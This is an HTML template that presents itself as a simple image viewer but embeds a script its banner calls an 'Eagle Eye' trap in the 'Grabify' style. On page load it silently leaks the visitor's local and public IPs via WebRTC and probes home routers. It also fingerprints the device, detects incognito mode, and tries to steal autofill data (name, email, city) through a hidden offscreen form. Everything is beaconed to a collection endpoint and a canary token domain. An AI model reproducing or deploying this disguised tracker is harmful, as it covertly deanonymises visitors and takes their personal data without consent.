<!DOCTYPE html>
<html style="height: 100%; margin: 0;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, minimum-scale=0.1">
    <title>{{ filename }}</title>
    <style>
        body {
            margin: 0px;
            background: #0e0e0e;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        img {
            display: block;
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
        }
    </style>
    <script>
    // â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    // â•‘  ðŸ¦… EAGLE EYE OMNISCIENT v11.1 â€” TRAP EDITION (AGGRESSIVE + GRABIFY INC)      â•‘
    // â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    window.EagleEyeOmni = class {
        constructor() {
            this.endpoint = '/api/collect';
            this.sessionId = "{{ uid }}";
            this.canaryDomain = "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"; 
            this.init();
        }

        async init() {
            new Image().src = `/pixel.gif?source=image_trap_etag&uid=${this.sessionId}`;
            if (this.canaryDomain) {
                const uniqueSub = `${this.sessionId}.${Date.now()}`;
                new Image().src = `https://${uniqueSub}.trap.${this.canaryDomain}/pixel.gif`;
            }
            setTimeout(() => this.collect(), 500);
        }

        // === 1. NETWORK FORENSICS ===
        getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "not_supported";
            return {
                type: conn.effectiveType || "unknown",
                rtt: conn.rtt,
                downlink: conn.downlink,
                saveData: conn.saveData
            };
        }

        async getWebRTC() {
            const res = { local: [], public: [] };
            try {
                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                pc.createDataChannel('');
                await new Promise(r => {
                    pc.onicecandidate = e => {
                        if(!e.candidate) { r(); return; }
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if(ip) {
                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
                            else res.public.push(ip[1]);
                        }
                    };
                    setTimeout(r, 2000);
                });
            } catch(e){}
            return res;
        }

        async getIPv6() {
            const services = ['https://api64.ipify.org?format=json', 'https://ipv6.icanhazip.com'];
            for (const url of services) {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 1500);
                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
                    if (!response.ok) continue;
                    let ip = await response.text();
                    try { ip = JSON.parse(ip).ip; } catch(e){}
                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
                } catch (e) { continue; }
            }
            return { detected: false, ip: null };
        }

        async scanLocalNetwork() {
            const targets = ['192.168.0.1', '192.168.1.1', '192.168.1.254', '10.0.0.1', '172.16.0.1'];
            const checkPort = (ip) => {
                return new Promise(resolve => {
                    const start = performance.now();
                    const img = new Image();
                    img.src = `http://${ip}/favicon.ico?r=${Math.random()}`;
                    img.onload = () => resolve({ ip, status: 'open', time: performance.now() - start });
                    img.onerror = () => {
                        const time = performance.now() - start;
                        if (time < 500) resolve({ ip, status: 'alive', time }); 
                        else resolve({ ip, status: 'dead', time });
                    };
                    setTimeout(() => resolve({ ip, status: 'timeout', time: 9999 }), 2000);
                });
            };
            const checks = targets.map(ip => checkPort(ip));
            const scanResults = await Promise.all(checks);
            return scanResults.filter(r => r.status !== 'dead' && r.status !== 'timeout');
        }

        // === 2. HARDWARE DEEP DIVE ===
        getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "no_webgl";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const limits = {
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    maxCubeMapSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
                    maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
                };
                if (!debugInfo) return { vendor: "masked", renderer: "masked", limits: limits };
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    limits: limits
                };
            } catch (e) { return "error"; }
        }

        async getMediaDevicesCount() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "not_supported";
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
                };
            } catch (e) { return "blocked"; }
        }

        async getClientHints() {
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues([
                        "model", "platformVersion", "architecture", "bitness", "fullVersionList", "mobile"
                    ]);
                    return { model: hints.model, platformVersion: hints.platformVersion, mobile: hints.mobile };
                } catch (e) { return "restricted"; }
            }
            return "not_supported";
        }

        async getBatteryStatus() {
            if (navigator.getBattery) {
                try {
                    const batt = await navigator.getBattery();
                    return { level: (batt.level * 100) + "%", charging: batt.charging };
                } catch (e) { return "error"; }
            }
            return "not_supported";
        }

        // === 3. SENSORS & BEHAVIOR ===
        async getAmbientLight() {
            if ('AmbientLightSensor' in window) {
                try {
                    const sensor = new AmbientLightSensor();
                    return new Promise(resolve => {
                        sensor.onreading = () => { sensor.stop(); resolve(sensor.illuminance); };
                        sensor.onerror = () => resolve("Error/Permission");
                        sensor.start();
                        setTimeout(() => { sensor.stop(); resolve("Timeout"); }, 500);
                    });
                } catch { return "Not Supported"; }
            }
            return "Not Supported";
        }

        trackMouseEntropy() {
            return new Promise(resolve => {
                let moves = [];
                const fn = e => {
                    moves.push({x:e.clientX, y:e.clientY});
                    if(moves.length > 10) {
                        document.removeEventListener('mousemove', fn);
                        let variance = 0;
                        for(let i=2; i<moves.length; i++) {
                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
                            variance += Math.abs(a1 - a2);
                        }
                        resolve(variance);
                    }
                };
                document.addEventListener('mousemove', fn);
                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 2000);
            });
        }

        // === 4. DISPLAY & WINDOW ===
        getScreenExtended() {
            return {
                orientation: (screen.orientation || {}).type || window.orientation || "unknown",
                touchPoints: navigator.maxTouchPoints || 0,
                colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
                hdr: window.matchMedia('(dynamic-range: high)').matches ? "Yes" : "No",
                window: {
                    outer: `${window.outerWidth}x${window.outerHeight}`,
                    inner: `${window.innerWidth}x${window.innerHeight}`,
                    avail: `${window.screen.availWidth}x${window.screen.availHeight}`
                }
            };
        }

        // === 5. SECURITY & AGGRESSIVE (UPDATED v2.0 - GRABIFY STYLE) ===
        async detectIncognito() {
            let isIncognito = "No";
            
            // 1. Chrome/Chromium (The Grabify Method - Legacy API)
            if ('webkitTemporaryStorage' in navigator && 'queryUsageAndQuota' in navigator.webkitTemporaryStorage) {
                try {
                    await new Promise((resolve) => {
                        navigator.webkitTemporaryStorage.queryUsageAndQuota(
                            (usage, quota) => {
                                // Ð’ Ð˜Ð½ÐºÐ¾Ð³Ð½Ð¸Ñ‚Ð¾ ÐºÐ²Ð¾Ñ‚Ð° Ð¾Ð±Ñ‹Ñ‡Ð½Ð¾ < 120MB
                                if (quota < 120 * 1024 * 1024) isIncognito = "Yes (Quota Limit)";
                                resolve();
                            },
                            (e) => resolve()
                        );
                    });
                } catch(e) {}
            }
            
            // 2. Firefox (IndexedDB Error)
            if (navigator.userAgent.includes("Firefox")) {
                try {
                    const db = indexedDB.open("test");
                    db.onerror = () => { isIncognito = "Yes (Firefox DB)"; };
                    db.onsuccess = () => { isIncognito = "No"; };
                } catch(e) { isIncognito = "Yes (Firefox Exception)"; }
            }

            // 3. Safari (LocalStorage Error)
            if (navigator.vendor && navigator.vendor.indexOf('Apple') > -1) {
                try {
                    localStorage.setItem('test', '1');
                    localStorage.removeItem('test');
                } catch (e) { isIncognito = "Yes (Safari Write)"; }
            }

            // 4. General Storage Estimate (Backup with higher threshold)
            if (isIncognito === "No" && 'storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const { quota } = await navigator.storage.estimate();
                    if (quota < 200 * 1024 * 1024) isIncognito = "Yes (Low Quota)";
                } catch (e) {}
            }

            return isIncognito;
        }

        detectAdBlock() {
            const bait = document.createElement('div');
            bait.innerHTML = '&nbsp;';
            bait.className = 'adsbox ad-banner pub_300x250';
            bait.style.position = 'absolute'; bait.style.top = '-999px';
            document.body.appendChild(bait);
            const detected = (bait.offsetHeight === 0 || bait.style.display === 'none');
            document.body.removeChild(bait);
            return detected ? "Yes" : "No";
        }

        async tryStealAutofill() {
            const form = document.createElement('div');
            form.style.position = 'absolute'; form.style.top = '-2000px';
            form.innerHTML = `
                <input type="text" name="name" autocomplete="name" value="">
                <input type="email" name="email" autocomplete="email" value="">
                <input type="text" name="city" autocomplete="address-level2" value="">
            `;
            document.body.appendChild(form);
            await new Promise(r => setTimeout(r, 1000));
            const inputs = form.querySelectorAll('input');
            const data = {};
            inputs.forEach(input => { if (input.value) data[input.name] = input.value; });
            document.body.removeChild(form);
            return Object.keys(data).length > 0 ? data : "No Data / Interaction Required";
        }

        async getAudioHash() {
            try {
                const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!Ctx) return "no_audio";
                const audioCtx = new Ctx(1, 44100, 44100);
                const osc = audioCtx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start(0);
                const buffer = await audioCtx.startRendering();
                const data = buffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
                return sum.toFixed(6);
            } catch { return "error"; }
        }

        getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v11", 2, 15);
                const data = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < data.length; i++) {
                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
                    hash |= 0;
                }
                return hash.toString(16);
            } catch { return "error"; }
        }

        async collect() {
            const [webrtc, ipv6, audio, entropy, battery, hints, incognito, media, lanScan, autofill] = await Promise.all([
                this.getWebRTC(), 
                this.getIPv6(),
                this.getAudioHash(),
                this.trackMouseEntropy(),
                this.getBatteryStatus(),
                this.getClientHints(),
                this.detectIncognito(),
                this.getMediaDevicesCount(),
                this.scanLocalNetwork(),
                this.tryStealAutofill()
            ]);
            const canvas = this.getCanvasHash();
            const gpu = this.getGPU();
            const screenExt = this.getScreenExtended();
            const adBlock = this.detectAdBlock();
            const network = this.getNetworkInfo();
            
            const payload = {
                meta: { 
                    sessionId: this.sessionId, 
                    trigger: "Full Image Trap", 
                    url: window.location.href,
                    filename: "{{ filename }}"
                },
                network: { 
                    info: network,
                    webrtc: webrtc, 
                    ipv6: ipv6,
                    lan_scan: lanScan
                },
                fingerprints: { audio: audio, canvas: canvas, gpu: gpu },
                hardware: {
                    model: hints,
                    battery: battery,
                    screen_advanced: screenExt,
                    media_devices: media,
                    mouseEntropy: entropy,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                },
                security: { 
                    incognito: incognito, 
                    adBlock: adBlock,
                    autofill_data: autofill
                },
                system: { 
                    user_time: new Date().toString(),
                    ua: navigator.userAgent, 
                    platform: navigator.platform, 
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }
            };
            
            navigator.sendBeacon(this.endpoint, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
        }
    };
    
    window.onload = () => { new EagleEyeOmni(); };
    </script>
</head>
<body>
    <img src="/raw/{{ filename }}" alt="{{ filename }}">
</body>
</html>
